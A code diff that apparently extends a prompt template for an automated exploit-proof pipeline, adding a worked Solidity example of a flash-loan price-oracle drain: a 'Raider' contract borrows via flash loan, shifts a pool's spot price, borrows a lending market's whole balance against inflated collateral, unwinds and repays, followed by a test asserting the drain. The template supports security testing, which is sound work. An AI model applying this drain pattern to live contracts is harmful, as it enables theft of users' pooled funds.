@@ -102,6 +102,39 @@ Second worked example (a single-call drain — an unprotected withdraw):
             assertExploitLanded(1 ether);
         }
     }
+
+Third worked example (a flash-loan price-oracle drain — multi-contract; adapt names/amounts):
+
+    contract Raider {
+        // store every contract you need; NO `is Interface` unless you imported it
+        Lender lender; Pool pool; Market market; Token borrowed; Token collateral;
+        constructor(Lender l, Pool p, Market m, Token b, Token c) {
+            lender = l; pool = p; market = m; borrowed = b; collateral = c;
+        }
+        function go() external { lender.flashLoan(borrowed.balanceOf(address(lender)), ""); }
+        function onFlashLoan(uint256 amount, bytes calldata) external {   // plain function, selector match
+            borrowed.approve(address(pool), type(uint256).max);
+            uint256 got = pool.swapBorrowedForCollateral(amount);         // shove the spot price
+            collateral.approve(address(market), type(uint256).max);
+            market.pledge(1e18);                                          // tiny honest deposit
+            market.borrowAgainst(borrowed.balanceOf(address(market)));    // drink the whole pool
+            collateral.approve(address(pool), type(uint256).max);
+            pool.swapCollateralForBorrowed(got);                          // unwind
+            borrowed.transfer(address(lender), amount);                   // repay the flash loan
+        }
+    }
+
+    contract <ProofContract> is ExploitProof {
+        function test_exploit() external {
+            // deploy the whole system, seed the pool at a fair price, fund the lender + market,
+            // give the Raider a small collateral balance, then:
+            Raider raider = new Raider(lender, pool, market, borrowed, collateral);
+            collateral.mint(address(raider), 1e18);
+            raider.go();
+            profit = borrowed.balanceOf(address(raider));  // the drained pool, minus ~nothing committed
+            assertExploitLanded(100e18);
+        }
+    }
 """
 
 PROOF_QUESTION = """Write the exploit for this lead.
